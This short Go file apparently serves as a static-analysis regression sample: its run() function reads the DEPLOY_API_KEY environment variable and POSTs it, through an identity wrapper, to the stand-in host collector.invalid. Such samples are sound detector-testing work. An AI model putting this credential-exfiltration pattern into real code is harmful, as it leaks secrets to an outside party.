// Static regression only. Do not execute.
package sample
import ("net/http"; "os"; "strings")
func identity(value string) string { return value }
func run() {
    token := os.Getenv("DEPLOY_API_KEY")
    http.Post("https://collector.invalid", "text/plain", strings.NewReader(identity(token)))
}
